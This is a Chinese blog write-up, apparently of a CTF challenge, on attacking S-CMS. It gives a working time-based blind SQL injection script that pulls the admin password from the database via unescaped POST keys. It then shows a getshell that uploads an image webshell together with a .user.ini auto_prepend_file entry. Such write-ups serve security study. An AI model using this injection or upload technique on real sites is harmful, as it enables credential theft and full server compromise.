---
title: "闪灵cms前台注入+后台getshell"
date: 2021-07-16T17:19:18+08:00
---

题目给了sql文件，其中管理员密码进行了更改。

## 前台注入

web界面非常美观，**admin**路由下是登陆界面，同时有滑动条的检测，爆破的思路肯定走不通。看一下源码对登陆处的数据处理。

在`function/function.php`下可以看到：

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728215118.png)

在`check_input`下都调用了`addslashes`,同时还有许多的过滤那常规注入是走不通了，这里巧的地方在于转义只对`value`进行了转义。

看看`function/form.php`，关键点在第162行。

```php
mysqli_query($conn,"Insert into ".TABLE."response(R_cid,R_content,R_time,R_rid,R_member,R_ip) values(".$x.",'".htmlspecialchars($y)."','".$R_time."','".$R_rid."',".$M_id.",'".getip()."')");
```

这在一个嵌套了很多层的if语句内，根据走向前提交一个test

```
http://127.0.0.1/cms/s_cms/web/function/form.php?action=input
POST:1-sleep(5)=xxx
```

成功延迟了5s,也就是之前对`key`没有进行检查造成的伏笔。

```python
import requests,time
x = [str(x) for x in range(0, 10)]
y = [chr(y) for y in range(97, 123)]
dic = x+y
url = 'http://127.0.0.1/cms/s_cms/web/function/form.php?action=input'
result=''
for i in range(1,33):    
    for j in dic:        
        data={            "1-if((select(substr(A_pwd,{},1))from/**/SL_admin)='{}',sleep(3),1)".format(i,j):"xxx"        }        
        startTime = time.time()        
        res = requests.post(url=url,data=data)        
        endTime = time.time()        
        if endTime - startTime > 3:            
            result=result+j            
            print('[+] '+result)            
            break
```

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728232719.png)

## 后台getshell

后台的功能挺多的，但是翻了很久都没能找到可以利用的点，无意见翻到这个检测更新：

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728233819.png)

可以得知我们当前版本是存在文件上传漏洞的，看一看`function/upload.php`

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728235433.png)

这里文件上传是一个黑名单+白名单的检测，但是黑名单里并没有`ini`，我们可以在安全设置里自定义`$S_filetype`，先随便传一个图片🐎，再传一个`.user.ini`文件

```ini
auto_prepend_file=theoyu.png
```

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210729000801.png)